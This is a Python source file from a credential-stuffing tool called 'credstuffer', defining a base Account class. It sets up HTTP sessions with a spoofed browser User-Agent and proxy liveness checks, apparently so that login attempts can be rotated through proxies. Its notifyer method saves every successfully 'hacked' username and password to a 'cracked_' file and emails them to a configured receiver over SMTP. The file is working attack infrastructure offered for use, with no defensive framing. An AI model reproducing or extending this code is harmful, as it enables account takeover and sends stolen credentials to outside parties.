import os
import requests
import logging
from abc import ABC, abstractmethod

from credstuffer.notification import Mail, Telegram


class Account(ABC):
    """ Abstract Base Class Account to provide basic methods for account specific attributes

    """
    def __init__(self, name, notify=None, SMTP=None, PORT=None, SENDER=None, RECEIVER=None, PASSWORD=None):
        self.logger = logging.getLogger('credstuffer')

        self.name = name
        self.root_dir = os.path.dirname(os.path.abspath(__file__))

        self.session = requests.Session()
        self.login_request_timeout = 2
        self.headers = {
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'de-DE,en-EN;q=0.9',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/60.0.3112.78 Chrome/60.0.3112.78 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
        }
        self.proxy_test_url = 'http://www.google.com'
        self.proxy_test_timeout = 2

        self.credential_file ='cracked_' + self.name
        self.notify = notify
        self.mail = None

        if self.notify is not None:
            if 'mail' in self.notify:
                self.mail = Mail(smtp_server=SMTP, port=PORT, sender=SENDER, receiver=RECEIVER)
                self.mail.login(username=SENDER, password=PASSWORD)
        else:
            self.logger.info("No credential notifyer configured")

    @abstractmethod
    def set_proxy(self, proxy):
        """ sets a proxy to the current session

        """
        pass

    def is_proxy_alive(self, proxy):
        """ checks if a proxy is alive

        :param proxy: proxy as ip:port
        :return: True if alive
        """
        try:
            self.session.proxies = proxy
            proxy_test_response = self.session.get(self.proxy_test_url, headers=self.headers, timeout=self.proxy_test_timeout, allow_redirects=False)
            if proxy_test_response.status_code == 200:
                return True
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout,
                requests.exceptions.ConnectionError) as e:
            self.logger.error(e)
            return False

    def random_user_agent(self):
        """

        :return:
        """
        pass

    def notifyer(self, username, password):
        """ saves and sends a notification in success case

        :param username: string username
        :param password: string password
        """

        with open(self.root_dir + '/' + self.credential_file + '.txt', 'a') as file:
            self.logger.info("writing credential to file {}".format(self.credential_file))
            file.write("username: {}, password: {}\n".format(username, password))

        if self.mail is not None:
            self.mail.set_subject("CREDSTUFFER: Credential Notification!")
            mail_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: {}\nPassword: {}"\
                            .format(self.name, username, password)
            self.mail.set_body(mail_content)
            self.logger.info("send credential mail: {}".format(mail_content))
            self.mail.send()
